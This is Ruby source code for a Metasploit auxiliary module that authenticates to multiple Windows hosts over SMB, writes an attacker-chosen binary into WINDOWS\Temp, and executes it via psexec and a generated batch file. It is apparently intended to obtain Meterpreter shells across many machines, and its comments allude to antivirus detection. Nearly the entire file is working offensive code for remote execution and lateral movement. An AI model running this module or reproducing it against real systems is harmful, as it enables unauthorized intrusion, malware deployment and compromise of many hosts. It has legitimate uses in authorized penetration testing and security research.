#!/usr/bin/env ruby

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB::Psexec

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize(info = {})
		super(update_info(info,
         	'Name'           => 'SMB - Rapid Fire Psexec Module',
         	'Description'    => %q{This module uploads a binary executeable to one or more hosts and fires it off.  
         		This can be used simarlry to Eric Milam's 'smbexec.sh' script to achieve meterprter shells from 
         		several hosts.  Make sure your multi/handler is set up properly before launching.  Note, binaries will be 
         		left behind in your target's WINDOWS\Temp directory so don't forget to delete them after you are finished.
	         },

	         'Author'         => [
	         	'Royce Davis <rdavis[at]accuvant.com>',
	         	'Twitter: <[at]R3dy__>',
	         ],
	         'License'        => MSF_LICENSE,
	         'References'     => [
	         	[ 'URL', 'http://www.pentestgeek.com' ],
	         	[ 'URL', 'http://www.accuvant.com' ],
	         	[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
	         ],
	    ))

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LPATH', [true, 'The local path to the binary you wish to upload & execute', '']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
		], self.class)

		deregister_options('RHOST')			
	end
	
	def peer
		return "#{rhost}:#{rport}"
	end	
	
	#-----------------------
	# Main control method
	#---------------------
	def run_host(ip)
		exe = "#{Rex::Text.rand_text_alpha(16)}.exe"
		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		bat = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
		#Try and connect to the target
		begin
			connect()
		rescue StandardError => connecterror
			print_error("Unable to connect to the target. #{connecterror}")
			return
		end
		
		# Try and authenticate with given credentials
		begin
			smb_login()
		rescue StandardError => autherror
			print_error("Unable to authenticate with the given credentials.")
			print_error("#{autherror.class}")
			print_error("#{autherror}")
			disconnect()
			return
		end
		
		# Try and execute the module
		smbshare = datastore['SMBSHARE']
		@smbshare = datastore['SMBSHARE']
		begin
			upload_binary(smbshare, ip, exe, cmd, text)
			execute_binary(smbshare, ip, exe, text, bat)
		rescue StandardError => mainerror
			print_error("Something went wrong.")
			print_error("#{mainerror.class}")
			print_error("#{mainerror}")
			disconnect()
			return
		end
		disconnect()
	end
	
	
	
	#--------------------------------------------------------------------------------------
	# This method will upload the binary executable to the target's WINDOWS\Temp directory	
	#--------------------------------------------------------------------------------------
	def upload_binary(smbshare, ip, exe, cmd, text)
		print_status("Uploading binary to #{ip}.")
		begin
			# Try and upload the binary
			data = ::File.read(datastore['LPATH'], ::File.size(datastore['LPATH']))
			if !simple.connect("\\\\#{ip}\\#{smbshare}")
				print_error("Couldn't mount the share.  Make sure you have local admin.")
				return
			end
			remote = simple.open("\\\\WINDOWS\\Temp\\#{exe}", 'rwct')
			remote.write(data)
			remote.close
		rescue StandardError => uploaderror
			print_error("Unable to upload the binary to #{ip}")
			print_error("#{uploaderror.class}")
			print_error("#{uploaderror}")
			return uploaderror
		end
		simple.disconnect("\\\\#{ip}\\#{smbshare}")
	end	
	
	#----------------------------------------------------------------------------
	# This method calls the uploaded binary.  Hopefully you'll get some shellz!!
	#----------------------------------------------------------------------------
	def execute_binary(smbshare, ip, exe, text, bat)
		print_status("Executing #{exe} on #{ip}.")
		begin
			# Try and run the binary
			command = "%COMSPEC% /C echo start C:\\WINDOWS\\Temp\\#{exe} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
			return psexec(command)
		rescue StandardError => executeerror
			print_error("Unable to run the binary on #{ip}.  Might have been caught by AV.")
			print_error("#{executeerror.class}")
			print_error("#{executeerror}")
			return executeerror
		end
	end
	
end
